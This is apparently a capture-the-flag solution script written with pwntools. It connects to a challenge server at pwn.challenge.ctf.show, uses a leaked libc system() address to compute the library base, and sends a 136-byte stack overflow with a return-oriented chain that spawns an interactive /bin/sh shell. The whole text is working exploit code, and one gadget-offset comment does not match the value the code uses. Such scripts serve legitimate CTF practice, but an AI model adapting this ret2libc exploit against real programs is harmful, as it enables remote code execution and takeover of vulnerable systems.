from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28200)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io.recvuntil("Maybe it's simple,O.o\n")
system = int(io.recvline(),16)
print(hex(system))
libc_base = system - libc.sym['system']
bin_sh = libc_base + next(libc.search('/bin/sh'))
pop_rdi = libc_base + 0x2a3e5  # 0x000000000002164f : pop rdi ; ret 
ret = libc_base + 0x8aa        
# 0x00000000000008aa : ret
payload = cyclic(136) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
io.send(payload)
io.interactive()